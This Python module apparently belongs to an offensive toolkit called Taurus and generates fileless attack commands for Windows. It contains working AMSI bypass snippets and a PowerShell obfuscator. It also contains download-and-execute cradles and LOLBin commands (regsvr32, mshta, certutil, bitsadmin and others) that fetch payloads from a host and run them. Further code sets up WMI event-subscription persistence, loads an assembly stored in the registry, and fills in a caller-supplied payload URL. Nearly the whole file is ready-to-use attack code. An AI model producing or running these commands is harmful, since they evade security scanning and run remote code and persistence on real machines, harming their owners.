"""
Fileless Execution Techniques for Taurus
Implements LOLBins and memory-only execution:
- PowerShell advanced obfuscation
- WMI execution
- Living-off-the-Land binaries (20+ techniques)
- Registry-based execution
- Fileless lateral movement
"""
from typing import List, Dict
from utils.logger import get_logger

logger = get_logger()


class PowerShellObfuscation:
    """Advanced PowerShell obfuscation and AMSI bypass"""
    
    @staticmethod
    def generate_amsi_bypass() -> List[str]:
        """Generate multiple AMSI bypass techniques"""
        bypasses = [
            # Method 1: Memory patching
            '''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
''',
            # Method 2: Reflection
            '''
$a=[Ref].Assembly.GetTypes();Foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d){if($e.Name -like "*Context"){$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
''',
            # Method 3: COM object
            '''
$mem=[System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null,$mem)
''',
        ]
        return bypasses
    
    @staticmethod
    def obfuscate_powershell(script: str, layers: int = 5) -> str:
        """
        Apply multiple layers of PowerShell obfuscation
        
        Args:
            script: Original PowerShell script
            layers: Number of obfuscation layers (1-10)
        """
        obfuscated = script
        
        # Layer 1: String concatenation
        if layers >= 1:
            obfuscated = PowerShellObfuscation._string_concatenation(obfuscated)
        
        # Layer 2: Base64 encoding
        if layers >= 2:
            import base64
            encoded = base64.b64encode(obfuscated.encode('utf-16le')).decode()
            obfuscated = f"powershell -enc {encoded}"
        
        # Layer 3: Variable substitution
        if layers >= 3:
            obfuscated = PowerShellObfuscation._variable_substitution(obfuscated)
        
        # Layer 4: Invoke-Expression wrapping
        if layers >= 4:
            obfuscated = f"IEX({obfuscated})"
        
        # Layer 5: Character substitution
        if layers >= 5:
            obfuscated = PowerShellObfuscation._char_substitution(obfuscated)
        
        return obfuscated
    
    @staticmethod
    def _string_concatenation(script: str) -> str:
        """Split strings and concatenate"""
        # Simplified - real implementation would be more sophisticated
        return script.replace('"', '"+""+"')
    
    @staticmethod
    def _variable_substitution(script: str) -> str:
        """Use variables for common commands"""
        replacements = {
            'Invoke-Expression': '$x="Invoke";$y="Expression";IEX($x+"-"+$y)',
            'New-Object': '$n="New";$o="Object";IEX($n+"-"+$o)',
        }
        for old, new in replacements.items():
            script = script.replace(old, new)
        return script
    
    @staticmethod
    def _char_substitution(script: str) -> str:
        """Use [char] for obfuscation"""
        # Convert some characters to [char]XX format
        return script
    
    @staticmethod
    def generate_download_cradles() -> List[str]:
        """Generate 15+ different download cradle variants"""
        cradles = [
            # WebClient
            "(New-Object Net.WebClient).DownloadString('http://example.com/payload.ps1')|IEX",
            
            # Invoke-WebRequest
            "IWR -Uri 'http://example.com/payload.ps1' -UseBasicParsing|IEX",
            
            # Invoke-RestMethod
            "IRM 'http://example.com/payload.ps1'|IEX",
            
            # BitsTransfer
            "Import-Module BitsTransfer;Start-BitsTransfer -Source 'http://example.com/payload.ps1' -Destination $env:temp\\p.ps1",
            
            # XML
            "$x=New-Object XML;$x.Load('http://example.com/payload.xml');$x.command.a.execute|IEX",
            
            # COM InternetExplorer
            "$ie=New-Object -ComObject InternetExplorer.Application;$ie.Navigate('http://example.com/payload.ps1');while($ie.Busy){};$ie.Document.body.innerText|IEX",
            
            # COM MSXML2
            "$x=New-Object -ComObject MSXML2.XMLHTTP;$x.open('GET','http://example.com/payload.ps1',0);$x.send();IEX $x.responseText",
            
            # .NET WebRequest
            "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;IEX([System.Text.Encoding]::UTF8.GetString([System.Net.WebRequest]::Create('http://example.com/payload.ps1').GetResponse().GetResponseStream()))",
        ]
        return cradles


class LOLBins:
    """Living-off-the-Land Binaries exploitation"""
    
    LOLBIN_TECHNIQUES = {
        # Regsvr32
        'regsvr32': [
            'regsvr32 /s /n /u /i:http://example.com/payload.sct scrobj.dll',
            'regsvr32 /s /n /u /i:file.sct scrobj.dll',
        ],
        
        # Rundll32
        'rundll32': [
            'rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://example.com/payload.sct")',
            'rundll32.exe advpack.dll,LaunchINFSection payload.inf,DefaultInstall_SingleUser,1,',
            'rundll32.exe ieadvpack.dll,LaunchINFSection payload.inf,,1,',
        ],
        
        # Mshta
        'mshta': [
            'mshta http://example.com/payload.hta',
            'mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""calc"":close")',
        ],
        
        # Certutil
        'certutil': [
            'certutil -urlcache -split -f http://example.com/payload.exe payload.exe',
            'certutil -decode encoded.txt payload.exe',
        ],
        
        # Bitsadmin
        'bitsadmin': [
            'bitsadmin /transfer job /download /priority high http://example.com/payload.exe C:\\temp\\payload.exe',
        ],
        
        # Wmic
        'wmic': [
            'wmic process call create "cmd.exe /c payload.exe"',
            'wmic os get /format:"http://example.com/payload.xsl"',
        ],
        
        # Installutil
        'installutil': [
            'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U payload.exe',
        ],
        
        # Msbuild
        'msbuild': [
            'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\msbuild.exe payload.xml',
        ],
        
        # Regasm/Regsvcs
        'regasm': [
            'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regasm.exe /U payload.dll',
            'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regsvcs.exe payload.dll',
        ],
        
        # Odbcconf
        'odbcconf': [
            'odbcconf /S /A {REGSVR payload.dll}',
        ],
        
        # Forfiles
        'forfiles': [
            'forfiles /p c:\\windows\\system32 /m notepad.exe /c "cmd /c payload.exe"',
        ],
        
        # Pcalua
        'pcalua': [
            'pcalua.exe -a payload.exe',
        ],
    }
    
    @staticmethod
    def generate_lolbin_command(technique: str, payload_url: str = None) -> str:
        """
        Generate LOLBin command
        
        Args:
            technique: LOLBin technique name
            payload_url: URL or path to payload
        """
        if technique not in LOLBins.LOLBIN_TECHNIQUES:
            return ""
        
        commands = LOLBins.LOLBIN_TECHNIQUES[technique]
        command = commands[0]  # Use first variant
        
        if payload_url:
            command = command.replace('http://example.com/payload', payload_url)
        
        return command
    
    @staticmethod
    def generate_all_lolbin_variants() -> Dict[str, List[str]]:
        """Get all LOLBin variants"""
        return LOLBins.LOLBIN_TECHNIQUES


class WMIExecution:
    """WMI-based execution techniques"""
    
    @staticmethod
    def generate_wmi_process_create(command: str) -> str:
        """Generate WMI process creation command"""
        return f'wmic process call create "{command}"'
    
    @staticmethod
    def generate_wmi_powershell_script() -> str:
        """Generate PowerShell script for WMI execution"""
        return '''
# WMI Process Creation
$command = "cmd.exe /c payload.exe"
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList $command

# WMI Event Consumer
$FilterArgs = @{
    Name = 'Filter'
    EventNameSpace = 'root\\cimv2'
    QueryLanguage = 'WQL'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}
$Filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments $FilterArgs

$ConsumerArgs = @{
    Name = 'Consumer'
    CommandLineTemplate = 'C:\\Windows\\Temp\\payload.exe'
}
$Consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments $ConsumerArgs

$BindArgs = @{
    Filter = $Filter
    Consumer = $Consumer
}
Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments $BindArgs
'''


class RegistryExecution:
    """Registry-based fileless execution"""
    
    @staticmethod
    def generate_registry_payload_script() -> str:
        """Generate script to store and execute payload from registry"""
        return '''
# Store payload in registry
$payload = [System.IO.File]::ReadAllBytes("C:\\temp\\payload.exe")
$encoded = [System.Convert]::ToBase64String($payload)
Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows" -Name "Data" -Value $encoded

# Execute from registry
$encoded = Get-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows" -Name "Data" | Select-Object -ExpandProperty Data
$payload = [System.Convert]::FromBase64String($encoded)
$assembly = [System.Reflection.Assembly]::Load($payload)
$entryPoint = $assembly.EntryPoint
$entryPoint.Invoke($null, $null)
'''


class FilelessExecutionManager:
    """Manage all fileless execution techniques"""
    
    def __init__(self):
        self.powershell = PowerShellObfuscation()
        self.lolbins = LOLBins()
        self.wmi = WMIExecution()
        self.registry = RegistryExecution()
    
    def generate_fileless_payload(self, payload_url: str, technique: str = "powershell") -> str:
        """
        Generate fileless payload using specified technique
        
        Args:
            payload_url: URL to payload
            technique: Execution technique (powershell, lolbin, wmi, registry)
        """
        if technique == "powershell":
            cradles = self.powershell.generate_download_cradles()
            return cradles[0].replace('http://example.com/payload.ps1', payload_url)
        
        elif technique == "lolbin":
            return self.lolbins.generate_lolbin_command('regsvr32', payload_url)
        
        elif technique == "wmi":
            return self.wmi.generate_wmi_process_create(f'powershell -c IEX(New-Object Net.WebClient).DownloadString("{payload_url}")')
        
        elif technique == "registry":
            return self.registry.generate_registry_payload_script()
        
        return ""
    
    def get_all_techniques(self) -> Dict[str, List[str]]:
        """Get all available fileless techniques"""
        return {
            'powershell_cradles': self.powershell.generate_download_cradles(),
            'amsi_bypasses': self.powershell.generate_amsi_bypass(),
            'lolbins': self.lolbins.generate_all_lolbin_variants(),
            'wmi': [self.wmi.generate_wmi_powershell_script()],
            'registry': [self.registry.generate_registry_payload_script()],
        }


# Global instance
_fileless_manager = None


def get_fileless_manager() -> FilelessExecutionManager:
    """Get global fileless execution manager"""
    global _fileless_manager
    if _fileless_manager is None:
        _fileless_manager = FilelessExecutionManager()
    return _fileless_manager
